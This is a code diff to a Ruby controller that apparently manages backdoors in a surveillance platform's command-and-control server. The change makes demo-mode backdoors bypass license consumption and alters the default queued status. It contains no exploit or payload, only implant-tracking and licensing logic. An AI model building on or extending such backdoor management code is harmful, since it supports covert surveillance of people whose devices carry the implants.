@@ -47,8 +47,6 @@ class BackdoorController < RESTController
     # parse the platform to check if the backdoor is in demo mode ( -DEMO appended )
     demo = true unless request['subtype']['-DEMO'].nil?
 
-    #TODO: consider the demo case!!!
-
     # is the backdoor already in the database? (has it synchronized at least one time?)
     backdoor = Item.where({_kind: 'backdoor', build: request['build_id'], instance: request['instance_id'], platform: request['subtype'].downcase, demo: demo}).first
 
@@ -57,6 +55,7 @@ class BackdoorController < RESTController
       trace :info, "#{backdoor[:name]} is synchronizing (#{backdoor[:status]})"
 
       # if the backdoor was queued, but now we have a license, use it and set the status to open
+      # a demo backdoor will never be queued
       if backdoor[:status] == 'queued' and LicenseManager.instance.burn_one_license(backdoor.type.to_sym, backdoor.platform.to_sym) then
         backdoor.status = 'open'
         backdoor.save
@@ -85,14 +84,18 @@ class BackdoorController < RESTController
     backdoor.platform = request['subtype'].downcase.gsub(/-DEMO/, '')
     backdoor.instance = request['instance_id']
     backdoor.demo = demo
-    
+
+    # default is queued
+    backdoor.status = 'queued'
+
     #TODO: add the upload files for the first sync
 
+    # demo backdoor don't consume any license
+    backdoor.status = 'open' if demo
+
     # check the license to see if we have room for another backdoor
-    if LicenseManager.instance.burn_one_license(backdoor.type.to_sym, backdoor.platform.to_sym) then
+    if demo == false and LicenseManager.instance.burn_one_license(backdoor.type.to_sym, backdoor.platform.to_sym) then
       backdoor.status = 'open'
-    else
-      backdoor.status = 'queued'
     end
 
     # save the new instance in the db
